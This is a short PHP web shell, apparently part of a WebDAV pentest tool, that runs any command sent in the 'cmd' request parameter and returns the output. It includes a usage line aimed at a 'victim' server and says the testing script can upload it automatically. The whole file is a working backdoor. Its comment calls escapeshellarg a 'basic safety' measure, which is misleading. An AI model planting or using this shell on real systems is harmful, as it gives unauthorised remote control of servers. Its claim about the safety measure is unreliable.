<?php
// backdoors/php_shell.php
// A simple web shell for command execution.
// Can be automatically uploaded by davtester.py on a successful PHP test.
//
// Usage: http://victim/webdav/php_shell.php?cmd=whoami

if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    // Use escapeshellarg to provide some basic safety,
    // though the server is already considered compromised.
    system(escapeshellarg($cmd), $return_var);
    echo "</pre>";
    die;
}
// The "DAVTEST-OK" string ensures that if the backdoor is uploaded
// as part of a test, it can still be validated by the tool.
echo "DAVTEST-OK";
?>
